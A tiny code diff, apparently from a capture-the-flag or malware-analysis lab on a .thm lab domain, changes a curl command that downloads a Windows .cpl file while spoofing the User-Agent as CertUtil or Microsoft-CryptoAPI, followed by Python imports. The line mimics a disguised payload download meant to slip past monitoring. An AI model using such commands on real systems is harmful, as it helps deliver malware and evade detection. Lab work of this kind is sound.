@@ -1,4 +1,4 @@
-curl --http1.1 -H "User-Agent: CertUtil URL Agent" -H "Cache-Control: no-cache" -H "Accept:" http://gifts.bemyvalentine.thm/bthprprs.cpl -o bthprprs.cpl
+curl --http1.1 -H "User-Agent: Microsoft-CryptoAPI/10.0" -H "Cache-Control: no-cache" -H "Accept:" http://gifts.bemyvalentine.thm/bthprprs.cpl -o bthprprs.cpl
 import base64
 import re
 
